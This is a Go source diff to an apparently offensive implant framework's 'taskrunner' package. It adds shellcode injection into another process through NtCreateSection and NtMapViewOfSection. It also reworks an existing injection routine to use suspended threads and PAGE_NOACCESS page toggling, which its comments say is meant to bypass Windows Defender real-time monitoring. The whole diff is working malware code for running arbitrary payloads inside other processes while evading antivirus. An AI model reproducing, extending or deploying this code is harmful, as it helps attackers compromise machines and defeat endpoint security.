@@ -21,6 +21,7 @@ package taskrunner
 import (
 	"bytes"
 	"encoding/binary"
+	"errors"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -60,6 +61,107 @@ func sysAlloc(size int, rwxPages bool) (uintptr, error) {
 	}
 	return addr, nil
 }
+func injectTaskNtSection(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
+	// Get handle for section object
+	var (
+		err               error
+		sectionHandle     windows.Handle = 0
+		size              uint64
+		localBaseAddress  uintptr = 0
+		targetBaseAddress uintptr = 0
+		sectionOffset     uintptr
+		threadHandle      windows.Handle = 0
+	)
+
+	size = uint64(len(data) + (4096 - (len(data) % 4096)))
+
+	_ = syscalls.NtCreateSection(&sectionHandle, 0x0002|0x0004|0x0008, 0, &size,
+		windows.PAGE_EXECUTE_READWRITE, 0x08000000, 0)
+	if sectionHandle == 0 {
+		// {{if .Config.Debug}}
+		log.Println("[!] NtCreateSection failed")
+		// {{end}}
+		return threadHandle, errors.New("[!] Failed NtCreateSection NtSectionHandle = 0x0")
+	}
+	// {{if .Config.Debug}}
+	log.Printf("NtCreateSection returned sectionHandle = %v\n", sectionHandle)
+	// {{end}}
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("[!] GetCurrentProcess failed")
+		// {{end}}
+		return threadHandle, err
+	}
+	_ = syscalls.NtMapViewOfSection(sectionHandle, currentProcHandle, &localBaseAddress,
+		0, 0, &sectionOffset, &size, 2, 0, windows.PAGE_READWRITE)
+	if localBaseAddress == 0 {
+		// {{if .Config.Debug}}
+		log.Println("[!] local NtMapViewOfSection failed")
+		// {{end}}
+		return threadHandle, errors.New("[!] Failed NtMapViewOfSection localBaseAddress = 0x0")
+	}
+	// {{if .Config.Debug}}
+	log.Printf("NtMapViewOfSection returned localBaseAddress = %v\n", localBaseAddress)
+	// {{end}}
+
+	if rwxPages {
+		_ = syscalls.NtMapViewOfSection(sectionHandle, processHandle, &targetBaseAddress,
+			0, 0, &sectionOffset, &size, 2, 0, windows.PAGE_EXECUTE_READWRITE)
+	} else {
+		_ = syscalls.NtMapViewOfSection(sectionHandle, processHandle, &targetBaseAddress,
+			0, 0, &sectionOffset, &size, 2, 0, windows.PAGE_EXECUTE_READ)
+	}
+	if targetBaseAddress == 0 {
+		// {{if .Config.Debug}}
+		log.Println("[!] remote NtMapViewOfSection failed")
+		// {{end}}
+		return threadHandle, errors.New("[!] Failed NtMapViewOfSection targetBaseAddress = 0x0")
+	}
+	// {{if .Config.Debug}}
+	log.Printf("NtMapViewOfSection returned targetBaseAddress = %v\n", targetBaseAddress)
+	// {{end}}
+
+	//creating suspended thread for trying to bypass windows defender real-time monitoring
+	_ = syscalls.RtlCreateUserThread(processHandle, 0, true, 0,
+		0, 0, targetBaseAddress, 0, &threadHandle, 0)
+
+	if threadHandle == 0 {
+		// {{if .Config.Debug}}
+		log.Println("[!] RtlCreateUserThread failed")
+		// {{end}}
+		return threadHandle, errors.New("[!] Failed RtlCreateUserThread threadHandle = 0x0")
+	}
+	// {{if .Config.Debug}}
+	log.Printf("RtlCreateUserThread returned threadHandle = %v\n", threadHandle)
+	log.Println("sleeping 10 seconds...")
+	// {{end}}
+
+	time.Sleep(20 * time.Second)
+	// Writing shellcode
+	syscalls.RtlCopyMemory(localBaseAddress, uintptr(unsafe.Pointer(&data[0])), uint32(len(data)))
+
+	err = syscalls.ResumeThread(threadHandle)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("[!] ResumeThread failed")
+		// {{end}}
+
+	}
+	// {{if.Config.Debug}}
+	log.Println("resumed suspended thread successfully")
+	// {{end}}
+	err = syscalls.NtUnmapViewOfSection(currentProcHandle, localBaseAddress)
+	if err != syscall.EINVAL {
+		// {{if .Config.Debug}}
+		log.Println("[!] Failed NtUnmapViewOfSection failed")
+		// {{end}}
+	}
+	// {{if .Config.Debug}}
+	log.Println("unmapped local view of section successfully")
+	// {{end}}
+	return threadHandle, nil
+}
 
 // injectTask - Injects shellcode into a process handle
 func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
@@ -73,11 +175,9 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 	// {{if .Config.Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
-	if rwxPages {
-		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
-	} else {
-		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	}
+
+	remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
 	// {{if .Config.Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
@@ -100,33 +200,69 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 		// {{end}}
 		return threadHandle, err
 	}
-	if !rwxPages {
-		var oldProtect uint32
-		// Set proper page permissions
-		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
-		if err != nil {
-			//{{if .Config.Debug}}
-			log.Println("VirtualProtectEx failed:", err)
-			//{{end}}
-			return threadHandle, err
-		}
-	}
-	// Create the remote thread to where we wrote the shellcode
 	// {{if .Config.Debug}}
-	log.Println("successfully injected data, starting remote thread ....")
+	log.Println("successfully injected data, setting page permissions to NO_ACCESS ....")
 	// {{end}}
-	attr := new(windows.SecurityAttributes)
-	var lpThreadId uint32
-	threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
-	// {{if .Config.Debug}}
-	log.Printf("createremotethread returned:  err = %v", err)
-	// {{end}}
+
+	var oldProtect uint32
+	// Set page no access permissions to try bypassing windows defender real-time monitoring
+	err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_NOACCESS, &oldProtect)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[!] failed to create remote thread")
+		log.Println("[!] Failed to set page permissions to no access", err)
 		// {{end}}
 		return threadHandle, err
 	}
+
+	// {{if .Config.Debug}}
+	log.Println("successfully set page permissions, starting suspended remote thread ....")
+	// {{end}}
+
+	err = syscalls.RtlCreateUserThread(processHandle, 0, true, 0, 0, 0,
+		remoteAddr, 0, &threadHandle, 0)
+	// {{if .Config.Debug}}
+	log.Printf("RtlCreateUserThread returned: threadHandle = %v  err = %v", threadHandle, err)
+	log.Printf("Sleeping 10 seconds...")
+	// {{end}}
+	time.Sleep(10 * time.Second)
+
+	if rwxPages {
+		// {{if .Config.Debug}}
+		log.Println("Setting page permissions to RWX ....")
+		// {{end}}
+		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Println("[!] VirtualProtectEx failed", err)
+			// {{end}}
+			return threadHandle, err
+		}
+	} else {
+		// {{if .Config.Debug}}
+		log.Println("Setting page permissions to RX ....")
+		// {{end}}
+		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Println("[!] VirtualProtectEx failed", err)
+			// {{end}}
+			return threadHandle, err
+		}
+	}
+	// {{if .Config.Debug}}
+	log.Println("successfully set page permissions, resuming suspended remote thread ....")
+	// {{end}}
+	err = syscalls.ResumeThread(threadHandle)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("[!] Failed ResumeThread")
+		// {{end}}
+		return threadHandle, err
+
+	}
+	// {{if .Config.Debug}}
+	log.Println("Suspended thread resumed successfully")
+	// {{end}}
 	return threadHandle, nil
 }
 
@@ -155,6 +291,7 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 		// {{end}}
 		return err
 	}
+	//_, err = injectTaskNtSection(lpTargetHandle, data, rwxPages)
 	_, err = injectTask(lpTargetHandle, data, rwxPages)
 	if err != nil {
 		return err
